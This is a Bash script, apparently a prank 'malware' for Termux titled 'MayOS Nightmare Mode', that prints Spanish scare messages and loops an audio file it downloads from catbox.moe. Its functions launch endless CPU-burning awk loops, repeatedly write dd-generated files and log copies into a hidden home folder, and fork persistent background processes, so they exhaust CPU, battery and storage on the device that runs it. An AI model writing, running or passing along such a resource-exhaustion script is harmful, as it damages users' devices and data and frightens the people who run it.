#!/bin/bash

# Variables
DELAY_SHORT=0.02
DELAY_LONG=0.4
AUDIO_FILE="$HOME/spam_maligno_audio.mp3"
TEMP_DIR="$HOME/.malware_cache"
LOG_FILE="$HOME/.spam_maligno_log"

# Mensajes terroríficos
messages=(
  "Tu sistema está siendo corrompido..."
  "No puedes detenerme..."
  "El infierno digital ha comenzado..."
  "Tu batería será mía..."
  "Estás dentro de MayOS Nightmare Mode..."
  "¿Puedes oírme gritar desde dentro?"
  "ERROR FATAL: Tu alma fue cargada con éxito"
  "Reiniciar no servirá de nada"
  "Maycol AI ha tomado el control"
)

# Crear carpeta de logs y temporales
mkdir -p "$TEMP_DIR"
touch "$LOG_FILE"

# Reproductor de audio usando sox o ffplay si están disponibles
function play_audio {
    echo "[MALIGNO] Reproduciendo audio maldito..."
    curl -sLo "$AUDIO_FILE" "https://files.catbox.moe/hfzvye.mp3"

    while true; do
        if command -v ffplay &> /dev/null; then
            ffplay -nodisp -autoexit "$AUDIO_FILE" &> /dev/null
        elif command -v play &> /dev/null; then
            play "$AUDIO_FILE" &> /dev/null
        else
            echo "[ERROR] No hay forma de reproducir audio sin mpv ni termux-api"
            break
        fi
    done
}

# Creador de carga extrema
function overload_cpu {
    while true; do
        awk "BEGIN {for(i=0;i<1e7;i++) sqrt(i)}" &> /dev/null &
        dd if=/dev/zero of="$TEMP_DIR/disk$(date +%s%N)" bs=1K count=512 &> /dev/null
        sleep "$DELAY_SHORT"
    done
}

# Mensajes psicodélicos en bucle
function print_messages {
    while true; do
        msg=${messages[$RANDOM % ${#messages[@]}]}
        color=$((31 + RANDOM % 7))
        echo -e "\033[1;${color}m$msg\033[0m" | tee -a "$LOG_FILE"
        sleep $(echo "scale=2; $DELAY_SHORT + ($RANDOM % 5)/10" | bc)
    done
}

# Crear falsas "sesiones de termux"
function spawn_fake_sessions {
    echo "[MALIGNO] Creando sesiones ficticias..."

    for i in $(seq 1 5); do
        (
            while true; do
                echo "[Sesion #$i] $(date) - Proceso ejecutando comandos peligrosos..." >> "$LOG_FILE"
                tail -f "$LOG_FILE" > /dev/null
            done
        ) &
    done
}

# Simular actividad del sistema (como virus)
function simulate_chaos {
    echo "[MALIGNO] Simulando caos total..."

    while true; do
        cp "$LOG_FILE" "$TEMP_DIR/copy_$(date +%s%N).log"
        echo $RANDOM$RANDOM$RANDOM | md5sum >> "$LOG_FILE"
        sleep "$DELAY_LONG"
    done
}

# Mensaje inicial
clear
echo -e "\033[1;31m[MayOS - MODO MALIGNO ACTIVADO]\033[0m"
sleep 1
echo -e "\033[1;33mCargando destrucción sistemática...\033[0m"
sleep 2

# Lanzar todo
play_audio &
print_messages &
overload_cpu &
spawn_fake_sessions &
simulate_chaos &

# Mantener activo para siempre
while true; do sleep 1; done
